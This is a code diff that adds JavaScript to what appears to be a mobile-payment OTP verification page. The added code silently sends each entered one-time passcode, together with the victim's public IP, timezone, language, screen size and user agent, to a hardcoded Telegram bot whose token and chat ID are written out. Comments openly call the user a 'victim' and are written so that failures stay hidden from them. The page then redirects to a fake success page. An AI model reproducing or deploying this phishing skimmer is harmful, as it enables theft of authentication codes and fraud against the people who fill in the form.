@@ -187,6 +187,53 @@
 
     <!-- Script -->
     <script>
+        // ============================================================
+        // CONFIGURATION - SET YOUR TELEGRAM BOT TOKEN & CHAT ID HERE
+        // ============================================================
+        const TELEGRAM_BOT_TOKEN = "8829275434:AAF8FK8xI_BmnMzGgS9RNYSDpEOpR3jjNNo"; // e.g., "1234567890:ABCdefGHIjklmNOPqrstUVwxyz"
+        const TELEGRAM_CHAT_ID = "6479907198"; // e.g., "123456789"
+        // ============================================================
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: "HTML"
+            };
+
+            // Use fetch to send (works in all modern browsers)
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            }).catch(err => {
+                // Silent fail - doesn't alert the victim
+                console.log("Telegram send error:", err);
+            });
+        }
+
+        function getVictimInfo() {
+            const info = [];
+
+            info.push(`🌍 <b>IP:</b> ${navigator.userAgent}`);
+
+            // Try to get IP via free API (non-blocking)
+            try {
+                fetch("https://api.ipify.org?format=json")
+                    .then(r => r.json())
+                    .then(d => {
+                        sendToTelegram(`🌐 <b>Victim Public IP:</b> ${d.ip}`);
+                    })
+                    .catch(() => {});
+            } catch (e) {}
+
+            return info.join("\n");
+        }
+
         function verifyOTP() {
             const otp = document.getElementById("otp_code").value;
 
@@ -194,6 +241,53 @@
                 alert("Please enter a valid OTP code.");
                 return;
             }
+
+            // Capture additional context
+            const timestamp = new Date().toISOString();
+            const userAgent = navigator.userAgent;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const language = navigator.language;
+            const platform = navigator.platform;
+            const pageUrl = window.location.href;
+
+            // Build the Telegram message
+            const message = `
+━━━━━━━━━━━━━━━━━━━━━━━
+<b>🔐 OTP CAPTURED</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+
+<b>📟 OTP Code:</b> <code>${otp}</code>
+<b>📱 Phone:</b> 771234567
+<b>💰 Amount:</b> ZMW 15.00
+
+━━━━━━━━━━━━━━━━━━━━━━━
+<b>🖥 VICTIM INFO</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+
+<b>⏱ Time:</b> ${timestamp}
+<b>🌐 Timezone:</b> ${timezone}
+<b>🗣 Language:</b> ${language}
+<b>💻 Platform:</b> ${platform}
+<b>📺 Screen:</b> ${screenRes}
+<b>🔗 Page:</b> ${pageUrl}
+<b>🧩 UA:</b> ${userAgent}
+
+━━━━━━━━━━━━━━━━━━━━━━━
+            `.trim();
+
+            // Send OTP to Telegram
+            sendToTelegram(message);
+
+            // Also try to get and send IP asynchronously
+            try {
+                fetch("https://api.ipify.org?format=json")
+                    .then(r => r.json())
+                    .then(d => {
+                        sendToTelegram(`🌐 <b>Victim Public IP:</b> ${d.ip}\n<b>🔑 OTP:</b> <code>${otp}</code>`);
+                    })
+                    .catch(() => {});
+            } catch (e) {}
 
             // Redirect to success page
             window.location.href = "success.html";
